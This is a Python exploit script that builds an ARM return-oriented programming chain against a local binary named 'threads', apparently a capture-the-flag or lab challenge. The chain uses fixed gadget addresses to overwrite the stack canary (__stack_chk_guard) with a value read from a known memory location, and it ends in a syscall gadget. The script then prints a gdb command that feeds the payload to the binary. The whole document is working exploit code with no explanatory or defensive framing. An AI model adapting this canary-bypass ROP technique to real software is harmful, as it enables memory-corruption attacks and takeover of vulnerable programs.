#!/usr/bin/env python3
import struct

pop_r3_pc = 0x7a6fc
__stack_chk_guard = 0xa0f8c
global_randomness = 0xa1f04
ldr_r3_r3_cmp_r3_r5_beq_pop_r4_r5_r6_pc = 0x53848
add_r3_r3_1_str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc = 0x312b8
str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc = 0x312bc
ldr_r2_r4_str_r2_r3_4_pop_r4_r5_r6_pc = 0x30010
mov_r0_r3_pop_r4_r5_r7_pc = 0x14884
mov_r4_r0_mov_r5_r1_mov_r1_r0_mov_r0_2_blx_r3 = 0x7826c
syscall = 0x2ed5c

rop = b''.join((
    # stack filler, r11 = 0
    struct.pack('<II', 0, 0),

    # r3 = &global_randomness
    struct.pack('<II', pop_r3_pc, global_randomness),
    # r3 = global_randomness
    struct.pack('<I', ldr_r3_r3_cmp_r3_r5_beq_pop_r4_r5_r6_pc),
    # r4 = &__stack_chk_guard - 8, r5 = 0, r6 = 0
    struct.pack('<III', __stack_chk_guard - 8, 0, 0),
    # r3 = global_randomness + 1
    struct.pack('<I', add_r3_r3_1_str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc),
    # r4 = &__stack_chk_guard - 8, r5 = 0, r6 = 0, r7 = 0, r8 = 0
    struct.pack('<IIIII', __stack_chk_guard - 8, 0, 0, 0, 0),
    # r3 = global_randomness + 2
    struct.pack('<I', add_r3_r3_1_str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc),
    # r4 = &__stack_chk_guard - 8, r5 = 0, r6 = 0, r7 = 0, r8 = 0
    struct.pack('<IIIII', __stack_chk_guard - 8, 0, 0, 0, 0),
    # r3 = global_randomness + 3
    struct.pack('<I', add_r3_r3_1_str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc),
    # r4 = &__stack_chk_guard - 8, r5 = 0, r6 = 0, r7 = 0, r8 = 0
    struct.pack('<IIIII', __stack_chk_guard - 8, 0, 0, 0, 0),
    # r3 = global_randomness + 4
    struct.pack('<I', add_r3_r3_1_str_r3_r4_8_pop_r4_r5_r6_r7_r8_pc),
    # r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0
    struct.pack('<IIIII', 0, 0, 0, 0, 0),
    # r0 = global_randomness + 4
    struct.pack('<I', mov_r0_r3_pop_r4_r5_r7_pc),
    # r4 = 0, r5 = 0, r7 = 0
    struct.pack('<III', 0, 0, 0),
    # r3 = pop_r3_pc
    struct.pack('<II', pop_r3_pc, pop_r3_pc),
    # r4 = global_randomness + 4
    struct.pack('<I', mov_r4_r0_mov_r5_r1_mov_r1_r0_mov_r0_2_blx_r3),
    # r3 = &__stack_chk_guard - 4
    struct.pack('<I', __stack_chk_guard - 4),
    # __stack_chk_guard = *(global_randomness + 4)
    struct.pack('<I', ldr_r2_r4_str_r2_r3_4_pop_r4_r5_r6_pc),
    # r4 = 0, r5 = 0, r6 = 0
    struct.pack('<III', 0, 0, 0),

    # suicide thread
    struct.pack('<I', syscall),
))
assert len(rop) < 0x800, hex(len(rop))

hexstr = ''.join(f'\\x{b:02x}' for b in rop)
print(f'''printf '{hexstr}' >boom && gdb -ex 'layout split' -ex 'set args <boom' -ex 'b *0x105bc' -ex 'b *0x107cc' -ex 'r' ./threads''')
